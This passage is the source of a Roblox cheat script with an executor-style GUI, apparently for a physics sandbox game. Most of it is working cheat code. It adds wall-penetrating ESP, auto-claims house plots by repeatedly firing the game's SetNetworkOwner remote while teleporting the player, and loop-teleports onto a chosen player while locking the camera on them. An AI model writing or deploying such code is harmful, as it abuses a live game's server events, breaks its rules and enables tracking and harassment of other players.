        hitPart, _ = Workspace:FindPartOnRayWithIgnoreList(Ray.new(character[camPartName].Position, LocalPlayer.Character.CamPart.CFrame.lookVector * 5000), {character})

        if hitPart and hitPart.Parent and hitPart.Parent:IsA('Model') and hitPart.Parent:GetAttribute('IsAnchored') and IsValidPart(hitPart) then
            setanchorObject(hitPart)
        end
    end
end
function IsInCompileGroup(model)
    for _, groupData in ipairs(CompiledGroups)do
        if groupData.primaryPart then
            for _, item in pairs(groupData.group)do
                if item.model and item.model == model and (item.model:GetAttribute('Glue') or item.model:GetAttribute('GluePrimary')) and not item.model:GetAttribute('IsAnchored') then
                    return true
                end
            end
        end
    end

    return false
end
function CheckPrimaryPartOnCompileGroup(part)
    for _, groupData in ipairs(CompiledGroups)do
        if groupData.primaryPart and groupData.primaryPart == part and groupData.primaryPart:GetAttribute('IsAnchored') then
            return true
        end
    end

    return false
end
function IsHoldingAnchoredPart()
    grabParts = Workspace:FindFirstChild('GrabParts')
    heldModel = nil

    if grabParts then
        heldPart = grabParts.GrabPart.WeldConstraint.Part1

        if heldPart then
            for model, _ in pairs(AnchoredObjects)do
                if heldPart:IsDescendantOf(model) then
                    heldModel = AnchoredObjects[model].Model

                    break
                end
            end
        end
    end

    return heldModel
end
function CountCompileGroups()
    count = 0

    for _, _ in ipairs(CompiledGroups)do
        count = count + 1
    end

    return count
end
function ObjectStateBillboardGUI(model, stateText)
    billboard = model:FindFirstChild('ObjectText')

    if not billboard then
        billboard = Instance.new('BillboardGui')
        textLabel = Instance.new('TextLabel')
        billboard.Name = 'ObjectText'
        billboard.Parent = model
        billboard.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        billboard.Active = true
        billboard.Adornee = model
        billboard.AlwaysOnTop = true
        billboard.Size = UDim2.new(3, 0, 3, 0)
        billboard.Enabled = false
        textLabel.Name = 'State'
        textLabel.Parent = billboard
        textLabel.AnchorPoint = Vector2.new(0.5, 0.5)
        textLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        textLabel.BackgroundTransparency = 1
        textLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
        textLabel.Size = UDim2.new(1, 5, 0.340000004, 5)
        textLabel.Font = Enum.Font.SourceSans
        textLabel.Text = ''
        textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        textLabel.TextScaled = true
        textLabel.TextSize = 28
        textLabel.TextStrokeTransparency = 0
        textLabel.TextWrapped = true
    end
    if typeof(stateText) ~= 'string' then
        billboard.Enabled = false
    else
        billboard.State.TextColor3 = Color3.fromRGB(255, 255, 255)
        billboard.State.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)

        if stateText == 'Anchored' then
            billboard.State.TextColor3 = Color3.fromRGB(112, 186, 255)
            billboard.State.TextStrokeColor3 = Color3.fromRGB(0, 0, 127)
        elseif stateText == 'Disconnected' then
            billboard.State.TextColor3 = Color3.fromRGB(255, 0, 0)
            billboard.State.TextStrokeColor3 = Color3.fromRGB(67, 0, 0)
        end

        billboard.State.Text = stateText
        billboard.Enabled = true
    end
end
function RemoveCompileGroup(primaryPart)
    for index, groupData in ipairs(CompiledGroups)do
        if groupData.primaryPart and groupData.primaryPart == primaryPart then
            for _, constraint in pairs(groupData.Nc_Group)do
                constraint:Destroy()
            end

            ObjectStateBillboardGUI(primaryPart)

            for _, connection in pairs(groupData.gC)do
                connection:Disconnect()
            end
            for _, item in pairs(groupData.group)do
                item.model:SetAttribute('Glue', false)
                item.model:SetAttribute('GluePrimary', false)
                item.model:SetAttribute('IsAnchored', false)
                RemoveESP(item.model, 'Group')
            end

            table.remove(CompiledGroups, index)
        end
    end
end
function RemoveGroupCompileFromName(groupName)
    for _, groupData in ipairs(CompiledGroups)do
        if groupData.gN == groupName then
            for _, item in pairs(groupData.group)do
                DisconnectObject(item.model)
            end

            RemoveCompileGroup(groupData.primaryPart)
        end
    end
end
function CreateNoCollisionConstraintsCompile(primaryPart)
    for _, groupData in ipairs(CompiledGroups)do
        if groupData.primaryPart and groupData.primaryPart == primaryPart then
            for _, item in pairs(groupData.group)do
                if item.model == primaryPart and item.model and primaryPart then
                    for _, basePart1 in ipairs(item.model:GetChildren())do
                        if basePart1:IsA('BasePart') then
                            for _, otherItem in pairs(groupData.group)do
                                for _, basePart2 in ipairs(otherItem.model:GetChildren())do
                                    if basePart2:IsA('BasePart') then
                                        noCollision = Instance.new('NoCollisionConstraint', basePart1)
                                        noCollision.Part0 = basePart1
                                        noCollision.Part1 = basePart2
                                        noCollision.Enabled = true

                                        table.insert(groupData.Nc_Group, noCollision)
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end
end
function UpdateGroupPositions(primaryPart)
    for _, groupData in ipairs(CompiledGroups)do
        if groupData.primaryPart and groupData.primaryPart == primaryPart then
            for _, item in ipairs(groupData.group)do
                if item.model ~= primaryPart then
                    primaryPartReference = primaryPart.PrimaryPart or primaryPart:FindFirstChildOfClass('BasePart')

                    if primaryPartReference and primaryPart then
                        if item.bodypos then
                            item.bodypos.P = 40000
                            item.bodypos.D = 200
                            item.bodypos.Position = (primaryPartReference.CFrame * item.offset).Position

                            task.wait()

                            item.bodypos.Position = item.bodypos.Position + Vector3.new(0, 0.002, 0)
                        end
                        if item.bodygyro then
                            item.bodygyro.P = 40000
                            item.bodygyro.D = 200
                            item.bodygyro.CFrame = primaryPartReference.CFrame * item.offset
                        end
                    end
                end
            end
        end
    end
end
function CompileObjects()
    anchoredCount = 0

    for model, _ in pairs(AnchoredObjects)do
        if not IsInCompileGroup(model) then
            anchoredCount = anchoredCount + 1
        end
    end

    if anchoredCount == 0 then
        game.StarterGui:SetCore('SendNotification', {
            Title = 'Error',
            Text = 'No anchored parts found',
            Duration = 5,
        })

        return
    elseif anchoredCount == 1 then
        game.StarterGui:SetCore('SendNotification', {
            Title = 'Error',
            Text = 'Needs at least 2 anchored objects',
            Duration = 5,
        })

        return
    else
        heldAnchoredModel = IsHoldingAnchoredPart()

        if heldAnchoredModel then
            game.StarterGui:SetCore('SendNotification', {
                Title = 'Success',
                Text = 'Compiled ' .. anchoredCount .. ' Toys together',
                Duration = 5,
            })

            for model, _ in pairs(AnchoredObjects)do
                if not IsInCompileGroup(model) and CheckPrimaryPartOnCompileGroup(model) then
                    RemoveCompileGroup(model)
                end
            end

            groupName = 'Group ' .. CountCompileGroups() + 1
            groupItems = {}
            groupConnections = {}

            for model, data in pairs(AnchoredObjects)do
                if not IsInCompileGroup(model) then
                    anchoredPart = data.PartAnchored
                    offset = heldAnchoredModel.PrimaryPart.CFrame:toObjectSpace(anchoredPart.CFrame)

                    model:SetAttribute('IsAnchored', false)
                    RemoveESP(model, 'Anchored')

                    if model == heldAnchoredModel then
                        data.BodyGyro.MaxTorque = Vector3.new()
                        data.BodyPosition.MaxForce = Vector3.new()

                        model:SetAttribute('GluePrimary', true)
                        ChangeSBstate(data.SB, 'GluePrimary')
                    else
                        ChangeSBstate(data.SB, 'Glue')
                        model:SetAttribute('Glue', true)
                    end
                    if ESPEnabled.Group then
                        CreateESP(model, 'Group')
                    end

                    table.insert(groupItems, {
                        model = model,
                        part = anchoredPart,
                        offset = offset,
                        bodypos = data.BodyPosition,
                        bodygyro = data.BodyGyro,
                    })
                end
            end

            table.insert(CompiledGroups, {
                primaryPart = heldAnchoredModel,
                group = groupItems,
                Nc_Group = {},
                gC = groupConnections,
                gN = groupName,
            })
            CreateNoCollisionConstraintsCompile(heldAnchoredModel)
            ObjectStateBillboardGUI(heldAnchoredModel, groupName)

            updateConnection = game:GetService('RunService').Heartbeat:Connect(function()
                UpdateGroupPositions(heldAnchoredModel)
            end)

            table.insert(groupConnections, updateConnection)
            updateCompileGroupsDropdown(CompileGroups_Dropdown)
        else
            game.StarterGui:SetCore('SendNotification', {
                Title = 'Error',
                Text = 'You need to hold one of your anchored object',
                Duration = 5,
            })
        end
    end
end
function updateCompileGroupsDropdown(dropdown)
    groupNames = {}

    for _, groupData in ipairs(CompiledGroups)do
        table.insert(groupNames, groupData.gN)
    end

    dropdown:SetValues(groupNames)
end

imageButtonAnchor = Instance.new('ImageButton')
imageButtonAnchor.Size = UDim2.new(0, 50, 0, 50)
imageButtonAnchor.Position = UDim2.new(1, -325, 1, -80)
imageButtonAnchor.Image = 'rbxassetid://9716644'
imageButtonAnchor.BackgroundTransparency = 1
imageButtonAnchor.ImageTransparency = 0.2
imageButtonAnchor.ImageColor3 = Color3.fromRGB(142, 142, 142)
imageButtonAnchor.Visible = false
imageButtonAnchor.Active = false
gui2 = Instance.new('ScreenGui')
gui2.ResetOnSpawn = false
gui2.Name = 'CAG2'
gui2.Parent = LocalPlayer.PlayerGui
imageButtonAnchor.Parent = gui2
imageKLabelDe = Instance.new('ImageLabel')
imageKLabelDe.Size = UDim2.new(1, 0, 1, 0)
imageKLabelDe.Image = 'rbxassetid://304031128'
imageKLabelDe.BackgroundTransparency = 1
imageKLabelDe.Parent = imageButtonAnchor

imageButtonAnchor.InputBegan:Connect(function(input, processed)
    if not processed and game:GetService('UserInputService').TouchEnabled and input.UserInputType == Enum.UserInputType.Touch then
        anchorfunc()
    end
end)

local AnchorConnection = nil
local LeftGroupBox = Tabs.Anchor:AddLeftGroupbox('Anchoring', 'anchor')

LeftGroupBox:AddLabel('Press K to anchor your held object')
LeftGroupBox:AddDivider()

local Toggle1 = LeftGroupBox:AddCheckbox('anchorbind_toggle', {
    Text = '<b>[K]</b> Anchor Held',
    Default = false,
    Tooltip = 'Enables the K keybind and mobile button to anchor your held object',
})

Toggle1:OnChanged(function()
    local Value = Toggle1.Value

    imageButtonAnchor.Visible = Value
    imageButtonAnchor.Active = Value

    if Value then
        if AnchorConnection then
            AnchorConnection:Disconnect()
        end

        AnchorConnection = UserInputService.InputBegan:Connect(function(input, gameProcessed)
            if gameProcessed then
                return
            end
            if input.KeyCode == Enum.KeyCode.K then
                anchorfunc()
            end
        end)
    else
        if AnchorConnection then
            AnchorConnection:Disconnect()

            AnchorConnection = nil
        end
    end
end)

ToggleAutoRecover = LeftGroupBox:AddCheckbox('auto_recover_toggle', {
    Text = 'Auto Recover Parts',
    Default = false,
    Tooltip = 'Automatically teleports to and reclaims network ownership of your anchored parts',
})

ToggleAutoRecover:OnChanged(function()
    AutoRecoverEnabled = ToggleAutoRecover.Value

    if ToggleAutoRecover.Value then
        RecoverCoroutine = coroutine.create(RecoverParts)

        coroutine.resume(RecoverCoroutine)
    else
        RecoverCoroutine = nil
    end
end)

ToggleESPAnchored = LeftGroupBox:AddCheckbox('esp_anchored_toggle', {
    Text = 'ESP Anchored Objects',
    Default = false,
    Tooltip = 'Highlights all anchored objects through walls',
})

ToggleESPAnchored:OnChanged(function()
    ESPEnabled.Anchored = ToggleESPAnchored.Value

    UpdateAllESP()
end)
LeftGroupBox:AddDivider()
LeftGroupBox:AddButton({
    Text = 'Unanchor All',
    Func = function()
        unAnchorAll()
    end,
})

LeftAppearanceBox = Tabs.Anchor:AddLeftGroupbox('Anchor Appearance', 'palette')

LeftAppearanceBox:AddLabel('Selection Box Colors')

AnchoredLineToggle = LeftAppearanceBox:AddCheckbox('AnchoredLineToggle', {
    Text = 'Line Color',
    Default = false,
    Tooltip = 'Change the outline color of the anchor selection box',
})
AnchoredLineColor = AnchoredLineToggle:AddColorPicker('AnchoredLineColor', {
    Title = 'Anchor Line Color',
    Default = Color3.fromRGB(194, 194, 194),
})

AnchoredLineColor:OnChanged(function()
    SB_AnchoredColor3.Value = AnchoredLineColor.Value

    for model, data in pairs(AnchoredObjects)do
        if model:GetAttribute('IsAnchored') and not IsInCompileGroup(model) then
            ChangeSBstate(data.SB, 'Anchored')
        end
    end
end)

AnchoredSurfaceToggle = LeftAppearanceBox:AddCheckbox('AnchoredSurfaceToggle', {
    Text = 'Surface Color',
    Default = false,
    Tooltip = 'Change the fill/surface color of the anchor selection box',
})
AnchoredSurfaceColor = AnchoredSurfaceToggle:AddColorPicker('AnchoredSurfaceColor', {
    Title = 'Anchor Surface Color',
    Default = Color3.fromRGB(209, 0, 0),
})

AnchoredSurfaceColor:OnChanged(function()
    SB_AnchoredColor3Surface.Value = AnchoredSurfaceColor.Value

    for model, data in pairs(AnchoredObjects)do
        if model:GetAttribute('IsAnchored') and not IsInCompileGroup(model) then
            ChangeSBstate(data.SB, 'Anchored')
        end
    end
end)
LeftAppearanceBox:AddDivider()
LeftAppearanceBox:AddLabel('Box Transparency')

local SliderLineTransparency = LeftAppearanceBox:AddSlider('line_transparency', {
    Text = 'Line Transparency',
    Default = 0,
    Min = 0,
    Max = 1,
    Rounding = 2,
    Tooltip = 'How transparent the selection box outline is',
})

SliderLineTransparency:OnChanged(function()
    SB_LineTransparencyValue.Value = SliderLineTransparency.Value

    for model, data in pairs(AnchoredObjects)do
        if data.SB then
            data.SB.Transparency = SliderLineTransparency.Value
        end
    end
end)

local SliderSurfaceTransparency = LeftAppearanceBox:AddSlider('surface_transparency', {
    Text = 'Surface Transparency',
    Default = 0.5,
    Min = 0,
    Max = 1,
    Rounding = 2,
    Tooltip = 'How transparent the selection box fill is',
})

SliderSurfaceTransparency:OnChanged(function()
    SB_SurfaceTransparencyValue.Value = SliderSurfaceTransparency.Value

    for model, data in pairs(AnchoredObjects)do
        if data.SB then
            data.SB.SurfaceTransparency = SliderSurfaceTransparency.Value
        end
    end
end)

local RightGroupBox = Tabs.Anchor:AddRightGroupbox('Stick Groups', 'link')

RightGroupBox:AddLabel('Anchor Multiple Objects Together')
RightGroupBox:AddDivider()

local ToggleESPGroup = RightGroupBox:AddCheckbox('esp_group_toggle', {
    Text = 'ESP Compiled Groups',
    Default = false,
    Tooltip = 'Highlights all objects that are part of a compiled group',
})

ToggleESPGroup:OnChanged(function()
    ESPEnabled.Group = ToggleESPGroup.Value

    UpdateAllESP()
end)
RightGroupBox:AddButton({
    Text = 'Stick Group of Toys',
    Func = function()
        CompileObjects()
    end,
})
RightGroupBox:AddDivider()
RightGroupBox:AddLabel('Manage Existing Groups')

CompileGroups_Dropdown = RightGroupBox:AddDropdown('compile_groups', {
    Text = 'Select Group',
    Values = {},
    Default = 1,
    Multi = false,
    Tooltip = 'Select a compiled group to manage',
})

CompileGroups_Dropdown:OnChanged(function()
    _G.CompileGroupSelected = CompileGroups_Dropdown.Value or ''
end)
RightGroupBox:AddButton({
    Text = 'Delete Selected Group',
    Func = function()
        if _G.CompileGroupSelected and _G.CompileGroupSelected ~= '' then
            RemoveGroupCompileFromName(_G.CompileGroupSelected)
            updateCompileGroupsDropdown(CompileGroups_Dropdown)
        else
            game.StarterGui:SetCore('SendNotification', {
                Title = 'Error',
                Text = 'Select a group first',
                Duration = 3,
            })
        end
    end,
})

local RightAppearanceBox = Tabs.Anchor:AddRightGroupbox('Glue Appearance', 'droplet')

RightAppearanceBox:AddLabel('Glue Object')

local GlueLineToggle = RightAppearanceBox:AddCheckbox('GlueLineToggle', {
    Text = 'Glue Line Color',
    Default = false,
    Tooltip = 'Change the outline color of glued objects in a group',
})
local GlueLineColor = GlueLineToggle:AddColorPicker('GlueLineColor', {
    Title = 'Glue Line Color',
    Default = Color3.fromRGB(255, 0, 57),
})

GlueLineColor:OnChanged(function()
    SB_GlueColor3.Value = GlueLineColor.Value

    for _, groupData in ipairs(CompiledGroups)do
        for _, item in pairs(groupData.group)do
            if item.model:GetAttribute('Glue') and not item.model:GetAttribute('GluePrimary') then
                local data = AnchoredObjects[item.model]

                if data then
                    ChangeSBstate(data.SB, 'Glue')
                end
            end
        end
    end
end)

local GlueSurfaceToggle = RightAppearanceBox:AddCheckbox('GlueSurfaceToggle', {
    Text = 'Glue Surface Color',
    Default = false,
    Tooltip = 'Change the fill/surface color of glued objects in a group',
})
local GlueSurfaceColor = GlueSurfaceToggle:AddColorPicker('GlueSurfaceColor', {
    Title = 'Glue Surface Color',
    Default = Color3.fromRGB(244, 244, 244),
})

GlueSurfaceColor:OnChanged(function()
    SB_GlueColor3Surface.Value = GlueSurfaceColor.Value

    for _, groupData in ipairs(CompiledGroups)do
        for _, item in pairs(groupData.group)do
            if item.model:GetAttribute('Glue') and not item.model:GetAttribute('GluePrimary') then
                local data = AnchoredObjects[item.model]

                if data then
                    ChangeSBstate(data.SB, 'Glue')
                end
            end
        end
    end
end)
RightAppearanceBox:AddDivider()
RightAppearanceBox:AddLabel('Primary (Held) Object Colors')

MainGlueLineToggle = RightAppearanceBox:AddCheckbox('MainGlueLineToggle', {
    Text = 'Primary Glue Line Color',
    Default = false,
    Tooltip = 'Change the outline color of the primary/held object in a group',
})
MainGlueLineColor = MainGlueLineToggle:AddColorPicker('MainGlueLineColor', {
    Title = 'Primary Glue Line Color',
    Default = Color3.fromRGB(123, 85, 38),
})

MainGlueLineColor:OnChanged(function()
    SB_MainGlueColor3.Value = MainGlueLineColor.Value

    for _, groupData in ipairs(CompiledGroups)do
        for _, item in pairs(groupData.group)do
            if item.model:GetAttribute('GluePrimary') then
                local data = AnchoredObjects[item.model]

                if data then
                    ChangeSBstate(data.SB, 'GluePrimary')
                end
            end
        end
    end
end)

MainGlueSurfaceToggle = RightAppearanceBox:AddCheckbox('MainGlueSurfaceToggle', {
    Text = 'Primary Glue Surface Color',
    Default = false,
    Tooltip = 'Change the fill/surface color of the primary/held object in a group',
})
MainGlueSurfaceColor = MainGlueSurfaceToggle:AddColorPicker('MainGlueSurfaceColor', {
    Title = 'Primary Glue Surface Color',
    Default = Color3.fromRGB(0, 244, 36),
})

MainGlueSurfaceColor:OnChanged(function()
    SB_MainGlueColor3Surface.Value = MainGlueSurfaceColor.Value

    for _, groupData in ipairs(CompiledGroups)do
        for _, item in pairs(groupData.group)do
            if item.model:GetAttribute('GluePrimary') then
                local data = AnchoredObjects[item.model]

                if data then
                    ChangeSBstate(data.SB, 'GluePrimary')
                end
            end
        end
    end
end)

PlaceBox = Tabs.TpTab:AddLeftGroupbox('Teleport To Location', 'plane')
PlayerBox = Tabs.TpTab:AddRightGroupbox('Teleport To Target', 'orbit')
Scripts = Tabs.TpTab:AddRightGroupbox('Auto Claim Plot', 'wind')
PLOT_NAMES = {
    [1] = 'Pink House',
    [2] = 'Spooky House',
    [3] = 'Blue House',
    [4] = 'Green House',
    [5] = 'Chinese House',
}
getgenv().SelectedPlot = nil
getgenv().ClaimSelectedPlot = false
getgenv().MyPlotClaimStart = {}
PlotClaimTimes = {}
PlotInfoLabel = Scripts:AddLabel('No plot selected')
PlotInsideLabel = Scripts:AddLabel('Inside Plot: N/A')
PlotInsideCountLabel = Scripts:AddLabel('Players Inside: 0')
PlotMyTimeLabel = Scripts:AddLabel('Your Ownership: N/A')

function FormatTime(seconds)
    seconds = math.floor(seconds)

    local hrs = math.floor(seconds / 3600)
    local mins = math.floor((seconds % 3600) / 60)
    local secs = seconds % 60

    if hrs > 0 then
        return string.format('%02ih %02im %02is', hrs, mins, secs)
    elseif mins > 0 then
        return string.format('%02im %02is', mins, secs)
    else
        return string.format('%02is', secs)
    end
end
function IsPointInsidePart(part, point)
    local relative = part.CFrame:PointToObjectSpace(point)
    local half = part.Size * 0.5

    return math.abs(relative.X) <= half.X and math.abs(relative.Y) <= half.Y and math.abs(relative.Z) <= half.Z
end
function GetPlotIndex(plot)
    for i, p in ipairs(workspace.Plots:GetChildren())do
        if p == plot then
            return i
        end
    end

    return nil
end
function GetPlayersInPlot(plot)
    local zone = plot:FindFirstChild('Region') or plot:FindFirstChild('Zone') or plot:FindFirstChild('Base') or plot:FindFirstChildWhichIsA('BasePart')

    if not zone then
        return {}
    end

    local inside = {}

    for _, plr in ipairs(Players:GetPlayers())do
        local char = plr.Character
        local hrp = char and char:FindFirstChild('HumanoidRootPart')

        if hrp and IsPointInsidePart(zone, hrp.Position) then
            table.insert(inside, plr)
        end
    end

    return inside
end
function UpdatePlotInfo()
    local selected = getgenv().SelectedPlot

    if not selected then
        PlotInfoLabel:SetText('No plot selected')
        PlotInsideLabel:SetText('Inside Plot: N/A')
        PlotInsideCountLabel:SetText('Players Inside: 0')
        PlotMyTimeLabel:SetText('Your Ownership: N/A')

        return
    end

    for _, plot in ipairs(workspace.Plots:GetChildren())do
        local i = GetPlotIndex(plot)

        if not i then
            continue
        end

        local plotName = PLOT_NAMES[i] or ('Plot ' .. i)

        if selected ~= plotName then
            continue
        end

        local ownersFolder = plot.PlotSign.ThisPlotsOwners
        local owners = ownersFolder:GetChildren()
        local ownerNames = {}
        local playerCount = 0
        local longestTime = 0
        local isLocalOwner = false

        for _, owner in ipairs(owners)do
            if owner.Value and owner.Value ~= '' then
                playerCount += 1

                if owner.Value == LocalPlayer.Name then
                    isLocalOwner = true
                end

                local plr = Players:FindFirstChild(owner.Value)
                local displayText = owner.Value

                if plr and plr.DisplayName ~= plr.Name then
                    displayText = plr.DisplayName .. ' (@' .. plr.Name .. ')'
                end

                table.insert(ownerNames, displayText)

                if not PlotClaimTimes[owner.Value] then
                    PlotClaimTimes[owner.Value] = tick()
                end

                local ownedFor = tick() - PlotClaimTimes[owner.Value]

                if ownedFor > longestTime then
                    longestTime = ownedFor
                end
            end
        end

        if isLocalOwner then
            if not getgenv().MyPlotClaimStart[selected] then
                getgenv().MyPlotClaimStart[selected] = tick()
            end
        else
            getgenv().MyPlotClaimStart[selected] = nil
        end

        local myOwnedFor = getgenv().MyPlotClaimStart[selected] and (tick() - getgenv().MyPlotClaimStart[selected]) or nil
        local playersInside = GetPlayersInPlot(plot)
        local insideCount = #playersInside
        local insideNames = {}

        for _, p in ipairs(playersInside)do
            table.insert(insideNames, p.DisplayName or p.Name)
        end

        PlotInfoLabel:SetText('Selected Plot: ' .. plotName)
        PlotInsideLabel:SetText('Inside Plot: ' .. (insideCount > 0 and table.concat(insideNames, ', ') or 'None'))
        PlotInsideCountLabel:SetText('Players Inside: ' .. insideCount)
        PlotMyTimeLabel:SetText('Your Ownership: ' .. (myOwnedFor and FormatTime(myOwnedFor) or 'N/A'))

        return
    end
end
function GetPlotData()
    local tbl = {}
    local plotsFolder = workspace:FindFirstChild('Plots')

    if not plotsFolder then
        return tbl
    end

    for i, plot in ipairs(plotsFolder:GetChildren())do
        local plotName = PLOT_NAMES[i] or ('Plot ' .. i)

        table.insert(tbl, plotName)
    end

    return tbl
end

local PlotSelector

task.defer(function()
    PlotSelector = Scripts:AddDropdown('PlotSelector', {
        Text = 'Select Plot',
        Values = GetPlotData(),
        Multi = false,
        Default = nil,
        Tooltip = 'Choose plot',
        Callback = function(Value)
            getgenv().SelectedPlot = Value

            UpdatePlotInfo()
        end,
    })
end)
Scripts:AddButton({
    Text = 'Refresh Plots',
    Tooltip = 'Update plots',
    Func = function()
        if PlotSelector then
            PlotSelector:SetValues(GetPlotData())
        end

        UpdatePlotInfo()
    end,
})
Scripts:AddCheckbox('ClaimSelectedPlot', {
    Text = 'Claim Selected Plot',
    Tooltip = 'Claims chosen plot',
    Default = false,
}):OnChanged(function(v)
    getgenv().ClaimSelectedPlot = v
end)
task.spawn(function()
    while true do
        task.wait(1)
        UpdatePlotInfo()
    end
end)
task.spawn(function()
    while true do
        task.wait(0.1)

        if not getgenv().ClaimSelectedPlot then
            continue
        end
        if not getgenv().SelectedPlot then
            continue
        end

        local character = LocalPlayer.Character
        local hrp = character and character:FindFirstChild('HumanoidRootPart')

        if not hrp then
            continue
        end

        local oldCFrame = hrp.CFrame
        local oldVel = hrp.AssemblyLinearVelocity

        for i, plot in ipairs(workspace.Plots:GetChildren())do
            local plotName = PLOT_NAMES[i] or ('Plot ' .. i)

            if getgenv().SelectedPlot == plotName then
                local ownersFolder = plot.PlotSign.ThisPlotsOwners

                if #ownersFolder:GetChildren() <= 0 then
                    local jellyfish = plot.PlotSign.Sign.Plus.PlusGrabPart

                    while#ownersFolder:GetChildren() <= 0 and getgenv().ClaimSelectedPlot do
                        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('HumanoidRootPart') then
                            hrp.CFrame = jellyfish.CFrame + Vector3.new(10, 10, 10)

                            ReplicatedStorage.GrabEvents.SetNetworkOwner:FireServer(jellyfish, jellyfish.CFrame)
                        end

                        task.wait(0.1)
                    end

                    hrp.CFrame = oldCFrame
                    hrp.AssemblyLinearVelocity = oldVel
                end

                break
            end
        end
    end
end)

local loopTeleportActive = false

PlaceBox:AddDropdown('PlaceSelect', {
    Values = {
        'Spawn',
        'SpawnCave',
        'GreenHouse',
        'PinkHouse',
        'Barn',
        'BlueHouse',
        'ChineseHouse',
        'PurpleHouse',
        'Factory',
        'OtherGreenHouse',
        'BigCave',
        'TrainCave',
        'IslandCave',
        'ChineseRoof',
        'UfoCave',
        'Prison',
        'GoodPrison',
        'RuhubsDogAhhPrison',
        'ExtremelyGoodPrison',
        'BlueHouseSlot',
        'SpawnSlot',
        'HauntedSlot',
        'RandomSlot',
        'BeachSlot',
    },
    Default = 'Spawn',
    Text = 'Select Place',
    Tooltip = 'Choose what place you want to teleport to',
    Callback = function(Value)
        _G.PlaceToTeleport = Value
    end,
})
PlaceBox:AddCheckbox('LoopTeleportToggle', {
    Text = 'Loop Teleport',
    Default = false,
    Tooltip = 'Continuously teleport to the selected place with no delay',
    Callback = function(Value)
        loopTeleportActive = Value

        if Value then
            task.spawn(function()
                while loopTeleportActive do
                    local targetLocation = placeLocations[_G.PlaceToTeleport]

                    if targetLocation then
                        TeleportPlayer(targetLocation)
                    end

                    task.wait()
                end
            end)
        end
    end,
})
PlayerBox:AddDropdown('PlayerSelect', {
    Values = GetPlayerList(),
    Default = nil,
    Text = 'Select Player',
    Tooltip = 'Choose what player you want to teleport to',
    Callback = function(Value)
        _G.PlayerToTeleport = Value or ''
    end,
})
PlayerBox:AddButton({
    Text = 'Refresh Player List',
    Tooltip = 'Refreshes the target list',
    Func = function()
        Options.PlayerSelect:SetValues(GetPlayerList())
    end,
})
PlayerBox:AddButton({
    Text = 'Teleport to Player',
    Tooltip = 'Teleports to the selected player',
    Func = function()
        if _G.PlayerToTeleport == '' or not _G.PlayerToTeleport then
            return
        end

        local playerToTeleport = Players:FindFirstChild(_G.PlayerToTeleport)
        local playerRoot = GetPlayerRoot()

        if not playerToTeleport then
            return
        end

        local humanoidRootPart = playerToTeleport.Character and playerToTeleport.Character:FindFirstChild('HumanoidRootPart')

        if humanoidRootPart and playerRoot then
            teleportplayerfunctionoffset(humanoidRootPart.CFrame, playerRoot)
        end
    end,
})
PlayerBox:AddCheckbox('LoopPlayerTP', {
    Text = 'Loop Teleport',
    Tooltip = 'Loop teleport to the selected player',
    Default = false,
    Callback = function(Value)
        _G.LoopPlayerTP = Value

        if Value then
            task.spawn(function()
                while _G.LoopPlayerTP do
                    if _G.PlayerToTeleport == '' or not _G.PlayerToTeleport then
                        task.wait()

                        continue
                    end

                    local playerToTeleport = Players:FindFirstChild(_G.PlayerToTeleport)

                    if playerToTeleport and playerToTeleport.Character and not IsPlayerKickingWithBlobman() then
                        local characterModel = playerToTeleport.Character
                        local humanoidRootPart = characterModel:FindFirstChild('HumanoidRootPart')

                        if humanoidRootPart then
                            teleportplayerfunctionoffset(humanoidRootPart.CFrame, humanoidRootPart, characterModel, playerToTeleport.Name)
                        end
                    elseif not playerToTeleport then
                        _G.LoopPlayerTP = false

                        Toggles.LoopPlayerTP:SetValue(false)

                        break
                    end

                    task.wait()
                end
            end)
        end
    end,
})
PlayerBox:AddCheckbox('LockCameraPlayer', {
    Text = 'Lock Camera on Player',
    Tooltip = 'Locks your camera onto the player',
    Default = false,
    Callback = function(Value)
        _G.LockCameraOnPlayer = Value

        if Value then
            task.spawn(function()
                local renderConnection

                renderConnection = RunService.RenderStepped:Connect(function()
                    if not _G.LockCameraOnPlayer then
                        renderConnection:Disconnect()

                        return
                    end
                    if _G.PlayerToTeleport == '' or not _G.PlayerToTeleport then
                        return
                    end

                    local playerToLock = Players:FindFirstChild(_G.PlayerToTeleport)
                    local currentCamera = workspace.CurrentCamera

                    if playerToLock and playerToLock.Character and currentCamera then
                        local humanoidRootPart = playerToLock.Character:FindFirstChild('HumanoidRootPart')

                        if humanoidRootPart then
                            currentCamera.CFrame = CFrame.lookAt(currentCamera.CFrame.Position, humanoidRootPart.CFrame.Position + Vector3.new(0, 1, 0))
                        end
                    elseif not playerToLock then
                        _G.LockCameraOnPlayer = false

                        Toggles.LockCameraPlayer:SetValue(false)
                        renderConnection:Disconnect()
                    end
                end)
            end)
        end
    end,
})
PlayerBox:AddCheckbox('ViewPlayer', {
    Text = 'View Player',
    Tooltip = 'View the player',
    Default = false,
    Callback = function(Value)
        _G.ViewCameraOnPlayer = Value

        if Value then
            task.spawn(function()
                local camera = workspace.CurrentCamera
                local originalSubject = camera.CameraSubject

                while _G.ViewCameraOnPlayer do
                    if _G.PlayerToTeleport == '' or not _G.PlayerToTeleport then
                        task.wait()

                        continue
                    end

                    local playerToView = Players:FindFirstChild(_G.PlayerToTeleport)

                    if playerToView and playerToView.Character and camera then
                        local humanoid = playerToView.Character:FindFirstChildOfClass('Humanoid')

                        if humanoid then
                            camera.CameraSubject = humanoid
                        end
                    elseif not playerToView then
                        _G.ViewCameraOnPlayer = false

                        Toggles.ViewPlayer:SetValue(false)

                        camera.CameraSubject = originalSubject

                        break
                    end

                    task.wait()
                end

                camera.CameraSubject = originalSubject
            end)
        end
    end,
})
PlayerBox:AddSlider('TPOffset', {
    Text = 'Teleport Offset',
    Tooltip = 'How far of an offset you want (X, Y, Z, )',
    Default = 1,
    Min = 1,
    Max = 20,
    Rounding = 0,
    Suffix = ' studs',
    Callback = function(Value)
        _G.TeleportPlayerOffset = Value
    end,
})
PlayerBox:AddDropdown('TPBehavior', {
    Values = {
        'Behind',
        'Left',
        'Right',
        'Front',
        'Rotate',
    },
    Default = 'Behind',
    Tooltip = 'Lets you choose where you want to teleport',
    Text = 'Teleport Behavior',
    Callback = function(Value)
